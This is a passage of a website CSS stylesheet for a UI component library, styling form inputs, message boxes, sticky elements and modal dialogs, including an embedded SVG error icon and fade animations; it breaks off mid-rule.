        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-wrapper.has-help .spa-input-option-label {
            max-width: calc(100% - 72px)
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-list--vertical,
        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-list--horizontal {
            padding: 0 0 0 0;
            margin: 0
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-list--horizontal .spa-input-options-wrapper {
            float: left;
            margin: 0 26px 0 0
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-list--horizontal .spa-input-options-wrapper .spa-input-option-label {
            max-width: none
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-list--horizontal .horizontal-clear {
            clear: both
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-input-options-hint {
            margin: 5px 0 0 0;
            color: #6b5e51;
            font-size: 11px;
            min-height: 10px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-fieldset {
            margin: 0;
            padding: 0;
            width: auto;
            overflow: hidden;
            border: 0
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-fieldset-label {
            display: inline-block;
            font-family: "cnx-medium", Arial, "Helvetica Neue", Helvetica, Roboto, sans-serif;
            font-size: 14px;
            font-weight: normal;
            line-height: 1.5;
            margin-left: 0;
            padding: 0;
            background-color: inherit
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-fieldset-label.inline-legend-icon {
            float: left
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-fieldset-label.inline-legend-icon+.toggle-trigger.svg-button {
            margin-top: 1px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-fieldset-label~.toggle-trigger {
            margin-top: 3px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-fieldset-label.spa-error-form-label--validation,
        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-fieldset-label.spa-error-form-label--required {
            color: #DC1431
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-fieldset .toggle-trigger {
            padding: 3px 0 9px 0
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-fieldset .spa-input-options-list--vertical,
        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-fieldset .spa-input-options-list--horizontal {
            margin-top: 15px
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-fieldset .spa-input-options-wrapper .spa-input-option-label {
            max-width: none
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-fieldset .spa-input-options-wrapper .toggle-trigger {
            line-height: 38px;
            padding: 1px 0 9px 0
        }

        [data-sparta-container] .spa-input.spa-input--sparta2 .spa-fieldset .spa-input-error-message {
            margin-top: 0
        }

        [data-sparta-container] .spa-input-conditional-content-container {
            display: none !important
        }

        [data-sparta-container] .spa-input-conditional-content-wrapper {
            display: none
        }

        [data-sparta-container] .spa-input-option:checked~.spa-input-option-conditional-content>.spa-input-conditional-content-wrapper,
        [data-sparta-container] .spa-input-options:checked~.spa-input-option-conditional-content>.spa-input-conditional-content-wrapper {
            display: inherit;
            padding: 10px
        }

        [data-sparta-container] .spa-input-option.spa-input-options--inverse,
        [data-sparta-container] .spa-input-options.spa-input-options--inverse {
            color: #ffffff
        }

        [data-sparta-container] .spa-input-option.spa-input-options--inverse .spa-input-options-hint,
        [data-sparta-container] .spa-input-options.spa-input-options--inverse .spa-input-options-hint {
            color: #F1EFEC
        }

        [data-sparta-container] .spa-input-option.spa-input-options--inverse .toggle-trigger-link,
        [data-sparta-container] .spa-input-options.spa-input-options--inverse .toggle-trigger-link {
            color: #fff;
            text-decoration: underline
        }

        [data-sparta-container] .spa-input-option.spa-input-options--inverse .toggle-trigger-link:hover,
        [data-sparta-container] .spa-input-option.spa-input-options--inverse .toggle-trigger-link:focus,
        [data-sparta-container] .spa-input-options.spa-input-options--inverse .toggle-trigger-link:hover,
        [data-sparta-container] .spa-input-options.spa-input-options--inverse .toggle-trigger-link:focus {
            text-decoration: none;
            color: #F1EFEC
        }

        [data-sparta-container] .spa-input-option .flex-wrapper,
        [data-sparta-container] .spa-input-options .flex-wrapper {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: start;
            -webkit-justify-content: flex-start;
            -ms-flex-pack: start;
            justify-content: flex-start
        }

        [data-sparta-container] .spa-input-option .flex-wrapper .toggle-trigger.svg-button,
        [data-sparta-container] .spa-input-options .flex-wrapper .toggle-trigger.svg-button {
            min-width: 20px
        }

        [data-sparta-container] .spa-icon--error {
            background-image: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pg08IS0tIEdlbmVyYXRvcjogQWRvYmUgRmlyZXdvcmtzIENTNSwgRXhwb3J0IFNWRyBFeHRlbnNpb24gYnkgQWFyb24gQmVhbGwgKGh0dHA6Ly9maXJld29ya3MuYWJlYWxsLmNvbSkgLiBWZXJzaW9uOiAwLjYuMCAgLS0+DTwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DTxzdmcgaWQ9IiIgdmlld0JveD0iMCAwIDM2IDM2IiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjojZmZmZmZmMDAiIHZlcnNpb249IjEuMSINCXhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHhtbDpzcGFjZT0icHJlc2VydmUiDQl4PSIwcHgiIHk9IjBweCIgd2lkdGg9IjM2cHgiIGhlaWdodD0iMzZweCINPg0JPGcgaWQ9IkxheWVyJTIwMSI+DQkJPGc+DQkJCTxwYXRoIGQ9Ik0gMC41IDMwLjAzMTMgQyAwLjMxMjUgMzAuMzQzOCAwLjE1NjMgMzAuNjg3NSAwLjA5MzggMzEuMDMxMyBDIDAuMDMxMyAzMS40MDYzIDAgMzEuNzUgMCAzMi4wOTM4IEMgMCAzMi40Njg4IDAuMDMxMyAzMi44MTI1IDAuMTU2MyAzMy4xMjUgQyAwLjI4MTMgMzMuNDM3NSAwLjQzNzUgMzMuNzUgMC42MjUgMzQuMDMxMyBDIDAuODEyNSAzNC4zNDM4IDEgMzQuNjI1IDEuMjUgMzQuODc1IEMgMS41IDM1LjA5MzggMS43ODEzIDM1LjI4MTMgMi4wOTM4IDM1LjQ2ODggQyAyLjQwNjMgMzUuNjI1IDIuNzUgMzUuNzUgMy4wOTM4IDM1Ljg3NSBDIDMuNDA2MyAzNS45Mzc1IDMuNzgxMyAzNiA0LjE1NjMgMzYgTCAzMS44NDM4IDM2IEMgMzIuMjE4OCAzNiAzMi41NjI1IDM1LjkzNzUgMzIuOTA2MyAzNS44NzUgQyAzMy4yMTg4IDM1Ljc1IDMzLjU2MjUgMzUuNjI1IDMzLjg3NSAzNS40Njg4IEMgMzQuMTg3NSAzNS4yODEzIDM0LjQ2ODggMzUuMDkzOCAzNC43MTg4IDM0Ljg3NSBDIDM0Ljk2ODggMzQuNjI1IDM1LjE4NzUgMzQuMzQzOCAzNS4zNzUgMzQuMDMxMyBDIDM1LjU2MjUgMzMuNzUgMzUuNjg3NSAzMy40Mzc1IDM1LjgxMjUgMzMuMDkzOCBDIDM1LjkzNzUgMzIuNzUgMzYgMzIuNDA2MyAzNiAzMi4wNjI1IEMgMzYgMzEuNzUgMzUuOTM3NSAzMS40MDYzIDM1Ljg3NSAzMS4wMzEzIEMgMzUuODEyNSAzMC42ODc1IDM1LjY4NzUgMzAuMzQzOCAzNS41IDMwLjAzMTMgTCAyMS41OTM4IDIuMzEyNSBDIDIxLjQzNzUgMS45Mzc1IDIxLjIxODggMS42MjUgMjAuOTY4OCAxLjM0MzggQyAyMC43MTg4IDEuMDYyNSAyMC40MDYzIDAuODEyNSAyMC4wOTM4IDAuNjI1IEMgMTkuNzgxMyAwLjQzNzUgMTkuNDM3NSAwLjMxMjUgMTkuMDkzOCAwLjE4NzUgQyAxOC43MTg4IDAuMDYyNSAxOC4zNzUgMCAxOCAwIEMgMTcuNjI1IDAgMTcuMjUgMC4wNjI1IDE2LjkwNjMgMC4xODc1IEMgMTYuNTMxMyAwLjMxMjUgMTYuMTg3NSAwLjQzNzUgMTUuODc1IDAuNjI1IEMgMTUuNTYyNSAwLjgxMjUgMTUuMjUgMS4wNjI1IDE1IDEuMzQzOCBDIDE0Ljc1IDEuNjI1IDE0LjUzMTMgMS45Mzc1IDE0LjQwNjMgMi4zMTI1IEwgMC41IDMwLjAzMTMgTCAwLjUgMzAuMDMxMyBaIiBmaWxsPSIjZGMxMzMxIi8+DQkJPC9nPg0JCTxnPg0JCQk8cGF0aCBkPSJNIDE4IDI1LjUgQyAxOC41IDI1LjUgMTkgMjUuNTkzOCAxOS40Mzc1IDI1Ljc4MTMgQyAxOS44NzUgMjUuOTY4OCAyMC4yNSAyNi4yNSAyMC41OTM4IDI2LjU5MzggQyAyMC45MDYzIDI2LjkzNzUgMjEuMTg3NSAyNy4zMTI1IDIxLjM3NSAyNy43NSBDIDIxLjU2MjUgMjguMTg3NSAyMS42ODc1IDI4LjY1NjMgMjEuNjg3NSAyOS4xNTYzIEMgMjEuNjg3NSAyOS42NTYzIDIxLjU2MjUgMzAuMTU2MyAyMS4zNzUgMzAuNTkzOCBDIDIxLjE4NzUgMzEuMDYyNSAyMC45MDYzIDMxLjQ2ODggMjAuNTkzOCAzMS43ODEzIEMgMjAuMjUgMzIuMDYyNSAxOS44NzUgMzIuMzQzOCAxOS40Mzc1IDMyLjUzMTMgQyAxOSAzMi43MTg4IDE4LjUgMzIuODEyNSAxOCAzMi44MTI1IEMgMTcuNSAzMi44MTI1IDE3LjAzMTMgMzIuNzE4OCAxNi41OTM4IDMyLjUzMTMgQyAxNi4xNTYzIDMyLjM0MzggMTUuNzUgMzIuMDYyNSAxNS40MDYzIDMxLjc4MTMgQyAxNS4wNjI1IDMxLjQ2ODggMTQuODEyNSAzMS4wNjI1IDE0LjYyNSAzMC41OTM4IEMgMTQuNDM3NSAzMC4xNTYzIDE0LjM0MzggMjkuNjU2MyAxNC4zNDM4IDI5LjE1NjMgQyAxNC4zNDM4IDI4LjY1NjMgMTQuNDM3NSAyOC4xODc1IDE0LjYyNSAyNy43NSBDIDE0LjgxMjUgMjcuMzEyNSAxNS4wNjI1IDI2LjkzNzUgMTUuNDA2MyAyNi41OTM4IEMgMTUuNzUgMjYuMjUgMTYuMTU2MyAyNS45Njg4IDE2LjU5MzggMjUuNzgxMyBDIDE3LjAzMTMgMjUuNTkzOCAxNy41IDI1LjUgMTggMjUuNSBMIDE4IDI1LjUgWk0gMjAuOTM3NSAyMS4wOTM4IEwgMjAuOTM3NSAxMi4yODEzIEMgMjAuOTM3NSAxMS45MDYzIDIwLjg0MzggMTEuNTMxMyAyMC42ODc1IDExLjE4NzUgQyAyMC41MzEzIDEwLjg0MzggMjAuMzEyNSAxMC41MzEzIDIwLjA2MjUgMTAuMjUgQyAxOS44MTI1IDEwIDE5LjUgOS43ODEzIDE5LjEyNSA5LjYyNSBDIDE4Ljc1IDkuNDY4OCAxOC4zNzUgOS4zNzUgMTggOS4zNzUgQyAxNy41NjI1IDkuMzc1IDE3LjE4NzUgOS40Njg4IDE2Ljg0MzggOS42MjUgQyAxNi41IDkuNzgxMyAxNi4xODc1IDEwIDE1LjkzNzUgMTAuMjUgQyAxNS42ODc1IDEwLjUzMTMgMTUuNDY4OCAxMC44NDM4IDE1LjMxMjUgMTEuMTg3NSBDIDE1LjE1NjMgMTEuNTMxMyAxNS4wOTM4IDExLjkwNjMgMTUuMDkzOCAxMi4yODEzIEwgMTUuMDkzOCAyMS4wOTM4IEMgMTUuMDkzOCAyMS41MzEzIDE1LjE1NjMgMjEuOTA2MyAxNS4zMTI1IDIyLjI1IEMgMTUuNDY4OCAyMi42MjUgMTUuNjg3NSAyMi45Mzc1IDE1LjkzNzUgMjMuMTg3NSBDIDE2LjE4NzUgMjMuNDY4OCAxNi41IDIzLjY4NzUgMTYuODQzOCAyMy44NDM4IEMgMTcuMTg3NSAyNCAxNy41NjI1IDI0LjA2MjUgMTggMjQuMDYyNSBDIDE4LjM3NSAyNC4wNjI1IDE4Ljc1IDI0IDE5LjEyNSAyMy44NDM4IEMgMTkuNSAyMy42ODc1IDE5LjgxMjUgMjMuNDY4OCAyMC4wNjI1IDIzLjE4NzUgQyAyMC4zMTI1IDIyLjkzNzUgMjAuNTMxMyAyMi42MjUgMjAuNjg3NSAyMi4yNSBDIDIwLjg0MzggMjEuOTA2MyAyMC45Mzc1IDIxLjUzMTMgMjAuOTM3NSAyMS4wOTM4IEwgMjAuOTM3NSAyMS4wOTM4IFoiIGZpbGw9IiNmZmZmZmYiLz4NCQk8L2c+DQk8L2c+DTwvc3ZnPg==")
        }

        [data-sparta-container] .masked-element a {
            text-decoration: none
        }

        [data-sparta-container] .masked-element a:focus .masking-action,
        [data-sparta-container] .masked-element a:hover .masking-action {
            text-decoration: underline
        }

        [data-sparta-container] .spartaMessage {
            border: 1px solid #333;
            background-color: #fff;
            font-size: 14px;
            margin-top: 20px;
            margin-bottom: 40px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        [data-sparta-container] .spartaMessage p {
            font-size: 14px;
            margin: 0;
            padding: 0 0 10px 0
        }

        [data-sparta-container] .spartaMessage p:last-child {
            padding-bottom: 0
        }

        [data-sparta-container] .spartaMessage .spartaMessage-content {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            float: left;
            padding-top: 28px;
            padding-bottom: 28px
        }

        [data-sparta-container] .spartaMessage .spartaMessage-icon {
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 80px;
            -ms-flex: 0 0 80px;
            flex: 0 0 80px;
            padding: 20px 0;
            float: left;
            margin-right: 20px
        }

        [data-sparta-container] .spartaMessage .spartaMessage-dismiss {
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 25px;
            -ms-flex: 0 0 25px;
            flex: 0 0 25px
        }

        [data-sparta-container] .spartaMessage .spartaMessage-title {
            font-size: 18px;
            font-weight: bold;
            padding-bottom: 10px;
            margin-top: 0
        }

        [data-sparta-container] .spartaMessage .spartaMessage-list {
            margin-top: 0;
            padding-top: 0;
            margin-bottom: 0;
            padding-bottom: 0;
            margin-left: 13px
        }

        [data-sparta-container] .spartaMessage .spartaMessage-close-x {
            cursor: pointer;
            position: relative;
            color: #A39382;
            font-size: 40px;
            float: right;
            margin-top: 10px;
            margin-right: 10px
        }

        [data-sparta-container] .spartaMessage .spartaMessage-close-x:focus,
        [data-sparta-container] .spartaMessage .spartaMessage-close-x:hover {
            color: #524940;
            text-decoration: none;
            outline: 1px dotted #524940
        }

        [data-sparta-container] .spartaMessage .spartaMessage-icon {
            position: relative
        }

        [data-sparta-container] .spartaMessage .spartaMessage-icon .data-icon {
            margin: 0 auto;
            display: block;
            width: 40px;
            height: 40px;
            position: relative
        }

        [data-sparta-container] .spartaMessage .spartaMessage-icon .data-icon svg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: auto
        }

        [data-sparta-container] .spartaMessage .spartaMessage-icon .ada-text-message-icon {
            position: absolute;
            height: 100%;
            width: 100%;
            opacity: 0;
            pointer-events: none;
            top: 0
        }

        [data-sparta-container] .spartaMessage.error {
            border-color: #dc1431
        }

        [data-sparta-container] .spartaMessage.error .spartaMessage-icon {
            background: #f9dee1
        }

        [data-sparta-container] .spartaMessage.error .spartaMessage-title {
            color: #dc1431
        }

        [data-sparta-container] .spartaMessage.success {
            border-color: #7bb63f
        }

        [data-sparta-container] .spartaMessage.success .spartaMessage-icon {
            background: #eef6e6
        }

        [data-sparta-container] .spartaMessage.info {
            border-color: #007dc3
        }

        [data-sparta-container] .spartaMessage.info .spartaMessage-icon {
            background: #deeef7
        }

        [data-sparta-container] .spartaMessage.warning {
            border-color: #b05705
        }

        [data-sparta-container] .spartaMessage.warning .spartaMessage-icon {
            background: #fcf0e6
        }

        [data-sparta-container] .spartaMessage.large {
            font-size: 14px;
            margin-top: 20px;
            margin-bottom: 40px
        }

        [data-sparta-container] .spartaMessage.large p {
            font-size: 14px;
            padding: 0 0 10px 0
        }

        [data-sparta-container] .spartaMessage.large p:last-child {
            padding-bottom: 0
        }

        [data-sparta-container] .spartaMessage.large .spartaMessage-content {
            padding-top: 28px;
            padding-bottom: 28px
        }

        [data-sparta-container] .spartaMessage.large .spartaMessage-icon {
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 80px;
            -ms-flex: 0 0 80px;
            flex: 0 0 80px;
            padding: 20px 0;
            margin-right: 20px
        }

        [data-sparta-container] .spartaMessage.large .spartaMessage-dismiss {
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 25px;
            -ms-flex: 0 0 25px;
            flex: 0 0 25px
        }

        [data-sparta-container] .spartaMessage.large .spartaMessage-title {
            font-size: 18px;
            font-weight: bold;
            padding-bottom: 10px
        }

        [data-sparta-container] .spartaMessage.large .spartaMessage-close-x {
            font-size: 40px;
            margin-top: 10px;
            margin-right: 10px
        }

        [data-sparta-container] .spartaMessage.large .spartaMessage-icon .data-icon {
            width: 40px;
            height: 40px;
            background-size: 40px 40px
        }

        [data-sparta-container] .spartaMessage.medium {
            font-size: 14px;
            line-height: 16px;
            margin-top: 15px;
            margin-bottom: 15px
        }

        [data-sparta-container] .spartaMessage.medium p {
            font-size: 14px;
            line-height: 16px;
            padding: 0 0 10px 0
        }

        [data-sparta-container] .spartaMessage.medium p:last-child {
            padding-bottom: 0
        }

        [data-sparta-container] .spartaMessage.medium .spartaMessage-content {
            padding-top: 22px;
            padding-bottom: 22px
        }

        [data-sparta-container] .spartaMessage.medium .spartaMessage-icon {
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 60px;
            -ms-flex: 0 0 60px;
            flex: 0 0 60px;
            padding: 16px 0;
            margin-right: 20px
        }

        [data-sparta-container] .spartaMessage.medium .spartaMessage-dismiss {
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 25px;
            -ms-flex: 0 0 25px;
            flex: 0 0 25px
        }

        [data-sparta-container] .spartaMessage.medium .spartaMessage-title {
            font-size: 14px;
            font-weight: bold;
            padding-bottom: 10px
        }

        [data-sparta-container] .spartaMessage.medium .spartaMessage-close-x {
            font-size: 30px;
            margin-top: 5px;
            margin-right: 5px
        }

        [data-sparta-container] .spartaMessage.medium .spartaMessage-icon .data-icon {
            width: 28px;
            height: 28px;
            background-size: 28px 28px
        }

        [data-sparta-container] .spartaMessage.small {
            font-size: 11px;
            line-height: 14px;
            margin-top: 10px;
            margin-bottom: 10px
        }

        [data-sparta-container] .spartaMessage.small p {
            font-size: 11px;
            line-height: 14px;
            padding: 0 0 6px 0
        }

        [data-sparta-container] .spartaMessage.small p:last-child {
            padding-bottom: 0
        }

        [data-sparta-container] .spartaMessage.small .spartaMessage-content {
            padding-top: 7px;
            padding-bottom: 7px
        }

        [data-sparta-container] .spartaMessage.small .spartaMessage-icon {
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 40px;
            -ms-flex: 0 0 40px;
            flex: 0 0 40px;
            padding: 6px 0;
            margin-right: 12px
        }

        [data-sparta-container] .spartaMessage.small .spartaMessage-dismiss {
            -webkit-box-flex: 0;
            -webkit-flex: 0 0 25px;
            -ms-flex: 0 0 25px;
            flex: 0 0 25px
        }

        [data-sparta-container] .spartaMessage.small .spartaMessage-title {
            font-size: 11px;
            font-weight: bold;
            padding-bottom: 6px
        }

        [data-sparta-container] .spartaMessage.small .spartaMessage-close-x {
            font-size: 20px;
            margin-top: 3px;
            margin-right: 3px
        }

        [data-sparta-container] .spartaMessage.small .spartaMessage-icon .data-icon {
            width: 18px;
            height: 18px;
            background-size: 18px 18px
        }

        @-webkit-keyframes fadeIn {
            0% {
                display: block;
                opacity: 0
            }

            100% {
                display: block;
                opacity: 1
            }
        }

        @keyframes fadeIn {
            0% {
                display: block;
                opacity: 0
            }

            100% {
                display: block;
                opacity: 1
            }
        }

        @-webkit-keyframes fadeOut {
            0% {
                display: block;
                opacity: 1
            }

            100% {
                display: block;
                opacity: 0
            }
        }

        @keyframes fadeOut {
            0% {
                display: block;
                opacity: 1
            }

            100% {
                display: block;
                opacity: 0
            }
        }

        [data-sparta-container] .spa-sticky {
            -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0)
        }

        [data-sparta-container] .spa-sticky.fade-out {
            -webkit-animation: fadeOut .5s ease forwards;
            animation: fadeOut .5s ease forwards;
            pointer-events: none
        }

        [data-sparta-container] .spa-sticky.fade-in {
            -webkit-animation: fadeIn .5s ease forwards;
            animation: fadeIn .5s ease forwards
        }

        [data-sparta-container] .spa-sticky.active {
            position: fixed;
            z-index: 50
        }

        [data-sparta-container] .spa-sticky.active+.sticky-placeholder {
            display: block
        }

        [data-sparta-container] .spa-sticky[data-placeholder='false']:not(.active) {
            display: none
        }

        [data-sparta-container] .spa-sticky+.sticky-placeholder {
            display: none
        }

        [data-sparta-container] .spa-sticky+.sticky-placeholder-fade {
            height: 0 !important;
            overflow: hidden
        }

        [data-sparta-container] .spa-sticky[data-sticky-fade='true'] {
            opacity: 0
        }

        .spa-ui-layer-info-link {
            border-bottom: 1px dotted #0052C2
        }

        .spa-ui-layer-info-link:focus,
        .spa-ui-layer-info-link:hover {
            border-bottom: 1px solid blue;
            text-decoration: none
        }

        .spa-ui-layer .spa-content-alpha-layer {
            display: none;
            position: absolute;
            bottom: 16px;
            left: 10px;
            right: 10px;
            height: 40px;
            pointer-events: none;
            background: -webkit-linear-gradient(bottom, #fff 0%, rgba(255, 255, 255, 0) 50%);
            background: linear-gradient(to top, #fff 0%, rgba(255, 255, 255, 0) 50%);
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff', endColorstr='#00ffffff', GradientType=0)
        }

        .spa-ui-layer h1,
        .spa-ui-layer h2,
        .spa-ui-layer h3,
        .spa-ui-layer h4,
        .spa-ui-layer h5,
        .spa-ui-layer h6 {
            margin-bottom: .5rem
        }

        .spa-ui-layer-close {
            position: absolute;
            top: 12px;
            right: 15px;
            text-decoration: none;
            overflow: hidden
        }

        .spa-ui-layer-close .spa-close-x {
            position: relative;
            color: #A39382;
            font-size: 40px;
            -webkit-transition: all .3s ease 0s;
            transition: all .3s ease 0s
        }

        .spa-ui-layer-close:focus,
        .spa-ui-layer-close:hover {
            text-decoration: none !important
        }

        .spa-ui-layer-close:focus .spa-close-x,
        .spa-ui-layer-close:hover .spa-close-x {
            color: #524940;
            -webkit-transition: all .3s ease 0s;
            transition: all .3s ease 0s
        }

        .spa-ui-layer .spa-body {
            color: #333;
            font: 14px/18px Arial, "Helvetica Neue", Helvetica, Roboto, sans-serif
        }

        .spa-ui-layer .spa-body h3 {
            font-size: 18px;
            line-height: 25px;
            color: #524940;
            padding-bottom: 5px;
            margin-top: 0;
            line-height: 28px
        }

        .spa-ui-layer .content {
            overflow-y: auto;
            outline: none;
            position: relative
        }

        .spa-ui-layer .content .spa-btn {
            overflow: hidden
        }

        .spa-ui-layer .content .spa-btn.close-interstitial {
            margin-right: 15px
        }

        body.spa-ui-freeze-scroll {
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0
        }

        @media (max-width: 767px) {
            body.spa-ui-freeze-scroll .spa-layout-container {
                overflow: auto
            }
        }

        body.spa-ui-freeze-scroll .spa-layout-container {
            height: 100%
        }

        @media only screen and (min-device-width: 768px) and (max-device-width: 1024px) {
            body.spa-ui-freeze-scroll .spa-layout-container {
                overflow: auto
            }
        }

        @media only screen and (min-device-width: 768px) and (max-device-width: 1024px) and (-webkit-min-device-pixel-ratio: 2) {
            body.spa-ui-freeze-scroll .spa-layout-container {
                overflow: auto
            }
        }

        body.spa-ui-freeze-scroll.spa-ui-no-js-scroll {
            overflow: hidden;
            position: static
        }

        .spa-ui-modal {
            -webkit-transform-style: preserve-3d;
            transform-style: preserve-3d;
            position: relative;
            width: 100%;
            height: 100%;
            position: fixed;
            left: 0;
            top: 0;
            right: 0;
            bottom: 0;
            overflow-y: hidden
        }

        .spa-ui-modal:before {
            content: "";
            display: block;
            background: rgba(82, 73, 64, 0.9);
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 1000
        }

        .spa-ui-modal .spa-ui-layer-close .spa-close-x {
            color: #333
        }

        .spa-ui-modal .spa-ui-layer-close .spa-close-x:hover {
            color: #000
        }

        .spa-ui-modal-interstitial .spa-header {
            margin-bottom: 16px;
            height: 50px;
            background-color: #DC1431;
            background-size: cover
        }

        .spa-ui-modal-interstitial .spa-header.edge {
            background-color: #0073CF
        }

        .spa-ui-modal-interstitial .spa-header.enterprise {
            background-color: #0073CF
        }

        .spa-ui-modal-interstitial .spa-header.co-brand {
            margin-bottom: 45px
        }

        .spa-ui-modal-interstitial .spa-header.co-brand:after {
            content: "INTUIT";
            position: absolute;
            bottom: -40px;
            right: 30px;
            font-size: 2em;
            color: #0073CF
        }

        .spa-ui-modal-interstitial .spa-header .spa-ui-layer-close {
            top: 12px;
            right: 12px
        }

        .spa-ui-modal-interstitial .spa-header .spa-ui-layer-close .spa-close-x {
            color: #fff
        }

        .spa-ui-modal-interstitial .spa-header .spa-ui-layer-close .spa-close-x:hover {
            color: #F2F2F2
        }

        .spa-ui-modal .spa-dialog {
            position: absolute;
            margin-left: 0 !important;
            top: 50%;
            z-index: 1001;
            -webkit-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%);
            left: 50% !important;
            width: auto;
            max-width: 95%;
            margin-left: auto;
            max-height: 100%
        }

        .spa-ui-modal .spa-dialog.spa-ui-position-top {
            top: 0;
            -webkit-transform: translate(-50%, 0%);
            transform: translate(-50%, 0%)
        }

        .spa-ui-modal .spa-dialog.spa-ui-position-right {
            left: auto !important;
            right: 0;
            -webkit-transform: translate(0%, -50%);
            transform: translate(0%, -50%)
        }

        .spa-ui-modal .spa-dialog.spa-ui-position-bottom {
            top: auto;
            bottom: 0;
            -webkit-transform: translate(-50%, 0%);
            transform: translate(-50%, 0%)
        }

        .spa-ui-modal .spa-dialog.spa-ui-position-left {
            left: 0 !important;
            -webkit-transform: translate(0%, -50%);
            transform: translate(0%, -50%)
        }

        .spa-ui-modal .spa-header {
            padding: 10px 20px;
            position: relative
        }

        .spa-ui-modal .spa-content {
            background: none repeat scroll 0 0 #fff;
            color: #333;
            font: 14px/18px Arial, "Helvetica Neue", Helvetica, Roboto, sans-serif;
            max-height: 100vh;
            overflow-y: auto
        }

        @media (max-width: 767px) {
            .spa-ui-modal .spa-content {
                margin: 10px
            }
        }

        .spa-ui-modal .spa-body {
            padding: 10px 25px 30px 25px
        }

        .spa-ui-modal .spa-body h3 {
            font-size: 24px
        }

        .spa-ui-modal .spa-body p {
            margin: 0;
            margin-right: 15px;
            margin-bottom: 1.25rem;
            font-size: 14px;
            line-height: 1.3rem
        }

        .spa-ui-modal .spa-content-alpha-layer {
            bottom: 28px
        }

        .spa-ua-system-ios .spa-ui-modal .spa-dialog {
            top: 100px;
            position: fixed;
            -webkit-transform: translate(-50%, 0)
        }

        .spa-ua-system-iphone .spa-ui-modal .spa-dialog {
            top: 5px;
            width: 100% !important
        }

        @-webkit-keyframes fadeInDown {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes fadeInDown {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeInDownModal {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes fadeInDownModal {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeInUp {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes fadeInUp {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @-webkit-keyframes fadeInUpModal {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @keyframes fadeInUpModal {
            from {
                opacity: 0
            }

            to {
                opacity: 1
            }
        }

        @media only screen and (min-width: 768px) {
            @-webkit-keyframes fadeInDown {
                from {
                    opacity: 0;
                    -webkit-transform: translate3d(0, -25%, 0);
                    transform: translate3d(0, -25%, 0)
                }

                to {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none
                }
            }

            @keyframes fadeInDown {
                from {
                    opacity: 0;
                    -webkit-transform: translate3d(0, -25%, 0);
                    transform: translate3d(0, -25%, 0)
                }

                to {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none
                }
            }

            @-webkit-keyframes fadeInUp {
                from {
                    opacity: 0;
                    -webkit-transform: translate3d(0, 25%, 0);
                    transform: translate3d(0, 25%, 0)
                }

                to {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none
                }
            }

            @keyframes fadeInUp {
                from {
                    opacity: 0;
                    -webkit-transform: translate3d(0, 25%, 0);
                    transform: translate3d(0, 25%, 0)
                }

                to {
                    opacity: 1;
                    -webkit-transform: none;
                    transform: none
                }
            }
        }

        @-webkit-keyframes fadeOutUp {
            from {
                opacity: 1
            }

            to {
                opacity: 0
            }
        }

        @keyframes fadeOutUp {
            from {
                opacity: 1
            }

            to {
                opacity: 0
            }
        }

        @-webkit-keyframes fadeOutUpModal {
            from {
                opacity: 1
            }

            to {
                opacity: 0
            }
        }

        @keyframes fadeOutUpModal {
            from {
                opacity: 1
            }

            to {
                opacity: 0
            }
        }

        @-webkit-keyframes fadeOutDown {
            from {
